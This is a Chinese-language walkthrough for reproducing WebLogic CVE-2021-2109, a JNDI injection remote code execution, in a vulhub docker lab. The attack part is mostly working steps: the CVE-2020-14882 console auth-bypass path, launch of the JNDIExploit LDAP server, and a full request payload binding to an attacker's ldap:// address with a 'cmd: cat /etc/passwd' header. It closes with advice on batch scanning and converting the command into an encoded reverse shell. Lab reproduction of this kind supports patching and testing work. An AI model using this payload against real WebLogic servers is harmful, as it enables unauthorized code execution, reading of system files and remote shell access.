漏洞描述

WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。       该漏洞为Weblogic的远程代码执行漏洞。漏洞主要由JNDI注入，导致攻击者可利用此漏洞远程代码执行

影响版本

  • Weblogic Server 10.3.6.0.0

  • Weblogic Server 12.1.3.0.0

  • Weblogic Server 12.2.1.3.0

  • Weblogic Server 12.2.1.4.0

  • Weblogic Server 14.1.1.0.0

    漏洞环境搭建

    使用vulhub中的CVE-2020-14882环境可以进行复现（首先需要利用这个cve进行未授权访问漏洞）

    docker-compose up -d

    访问IP:7001/console/login/LoginForm.jsp出现下面的页面说明环境搭建成功

    漏洞复现

    首先下载LDAP工具，https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11

    这里需要注意一下，该工具需要java1.8的环境。

    首先利用cve-2020-14882未授权访问漏洞尝试访问后台管理页面。

    /console/css/%252e%252e%252f/consolejndi.portal

    访问成功后成功获取到cookie

    然后开启刚刚下好的工具 java -jar JDNIExploit-v1.11.jar -i ip

    这里的ip，虽然开启的是本机的ip，但是不能写成127.0.0.1，因为我们一会需要使用这个诱导网站访问这个ip，所以如果这里写成127.0.0.1，然后一会包里也写成127.0.0.1，docker中的环境就去访问自己了，而不是本机了。

    然后尝试构造数据包进行攻击，这里需要替换掉cookie，执行命令的地方是在头部中添加cmd: cat /etc/passwd。可以使用get请求发送，也可以使用post请求将payload作为包体发送。注意，这里的ip，第三个.需要替换为;，否则一直会重定向。

    payload如下

    _pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xx.xx.xx;xx:1389/Basic/WeblogicEcho;AdminServer%22)

    编写批量检测脚本，后台公众号回复cve-2021-2109即可获取，攻击使用要求为-j 你开启jdap的服务器ip，需要将第三个.换为;，-c cookie，-u 目标ip或-f 从文件中读取进行批量检测。

反弹shell，将cmd中的语句改为反弹shell的语句，并进行编码（在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html）
